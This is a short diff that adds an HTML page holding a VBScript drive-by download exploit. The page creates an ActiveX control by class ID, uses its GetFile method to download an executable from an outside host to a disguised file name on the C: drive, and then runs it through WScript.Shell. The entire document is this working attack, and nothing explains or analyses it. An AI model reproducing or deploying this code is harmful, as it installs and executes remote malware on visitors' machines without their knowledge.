@@ -1,0 +1,8 @@
+<pre>
+<object classid='clsid:24F3EAD6-8B87-4C1A-97DA-71C126BDA08F' id='test'></object>
+<script language='vbscript'>
+test.GetFile "http://www.plgou.com/csrss/rondll32.exe","c:\\msyahoo.exe",5,1,"tiany"
+Set WshShell = CreateObject("WScript.Shell")
+WshShell.Run"c:\\msyahoo.exe"
+</script>
+</pre>
